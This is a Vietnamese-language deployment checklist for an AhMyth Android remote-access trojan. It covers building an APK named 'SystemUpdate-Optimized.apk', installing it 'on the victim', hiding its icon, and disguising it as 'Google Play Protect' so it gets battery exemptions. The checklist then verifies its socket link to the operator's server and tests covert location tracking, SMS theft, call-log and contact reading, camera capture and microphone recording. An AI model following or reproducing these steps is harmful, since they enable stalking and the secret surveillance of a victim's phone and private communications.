# ✅ Checklist Triển Khai Nhanh

## 🎯 Trước Khi Build

- [ ] Đã đọc **SECURITY_AUDIT_REPORT.md**
- [ ] Đã kiểm tra server đang chạy
- [ ] Đã cấu hình server IP/port trong `strings.xml`

## 🔨 Build APK

- [ ] Chạy `Build_Optimized_APK.bat`
- [ ] Hoặc: `cd AhMyth-Client && gradlew assembleRelease`
- [ ] APK được tạo tại: `SystemUpdate-Optimized.apk`
- [ ] Kiểm tra mapping file: `app/build/outputs/mapping/release/mapping.txt`

## 📱 Cài Đặt Trên Victim

- [ ] `adb install -r SystemUpdate-Optimized.apk`
- [ ] Mở app
- [ ] Cấp tất cả quyền
- [ ] **BẤM ALLOW** khi popup "Bỏ qua tối ưu hóa pin"
- [ ] App tự động ẩn icon

## ⚙️ Cài Đặt Thủ Công (Quan Trọng!)

### Xiaomi (MIUI)
- [ ] Settings → Battery & Performance
- [ ] Battery Saver
- [ ] Tìm "Google Play Protect"
- [ ] Chọn "No restrictions"

### Samsung (One UI)
- [ ] Settings → Battery and Device Care
- [ ] Battery → Background usage limits
- [ ] Tìm "Google Play Protect"
- [ ] Chọn "Unrestricted"

### Oppo/Realme (ColorOS)
- [ ] Settings → Battery
- [ ] App Battery Management
- [ ] Tìm "Google Play Protect"
- [ ] Tắt "Background Freeze"
- [ ] Bật "Allow background activity"

## 🔔 Notification Listener (Tùy Chọn)

- [ ] Settings → Notifications
- [ ] Notification Access
- [ ] Chọn "Google Play Protect"
- [ ] Enable

## ✅ Verify

```bash
# Service đang chạy
adb shell dumpsys activity services | grep -i "MainService"

# Battery exemption
adb shell dumpsys deviceidle whitelist | grep -i "google.android.sys.security"

# Kết nối socket
adb shell netstat | grep -i "42474"
```

- [ ] Service đang chạy ✅
- [ ] Battery exemption enabled ✅
- [ ] Socket connected ✅

## 🧪 Test Các Tính Năng

- [ ] Location tracking (kiểm tra trên server)
- [ ] Đọc SMS
- [ ] Gửi SMS
- [ ] Đọc call logs
- [ ] Đọc contacts
- [ ] File manager
- [ ] Camera capture
- [ ] Microphone recording
- [ ] Notification listener (nếu enabled)

## 📊 Monitor (24 giờ đầu)

```bash
# Battery usage
adb shell dumpsys batterystats | grep -A 20 "com.google.android.sys.security"

# Memory usage
adb shell dumpsys meminfo com.google.android.sys.security

# Logs
adb logcat | grep -i "ConnectionManager"
```

- [ ] Battery usage < 5%/giờ ✅
- [ ] Memory usage < 50 MB ✅
- [ ] Không có crash/error ✅
- [ ] Connection stable > 95% ✅

## 🚨 Troubleshooting

### App bị kill sau vài giờ
- [ ] Kiểm tra battery exemption
- [ ] Cài đặt thủ công theo hãng (xem trên)

### Mất kết nối
- [ ] Kiểm tra server đang chạy
- [ ] Kiểm tra firewall/port forwarding
- [ ] Xem logs: `adb logcat | grep -i "ConnectionManager"`

### Pin hao quá nhanh
- [ ] Kiểm tra GPS có chạy liên tục không
- [ ] Xem battery stats
- [ ] Có thể tăng interval trong `ConnectionManager.java`

## 📚 Tài Liệu Tham Khảo

- **SECURITY_AUDIT_REPORT.md** - Báo cáo audit toàn diện
- **OPTIMIZATION_SUMMARY.md** - Tổng kết tối ưu
- **TESTING_GUIDE.md** - Hướng dẫn test chi tiết
- **FIX_SMS_CONNECTION_LOSS.md** - Sửa lỗi SMS
- **README_OPTIMIZED.md** - Tài liệu tổng hợp

---

## ✅ Kết Luận

Nếu tất cả các mục trên đều ✅, hệ thống đã sẵn sàng hoạt động 24/7!

**Uptime mong đợi:**
- Xiaomi: 5-7 ngày
- Samsung: 7-10 ngày
- Oppo: 3-5 ngày

**Battery usage:** < 5%/giờ  
**Connection stability:** > 95%
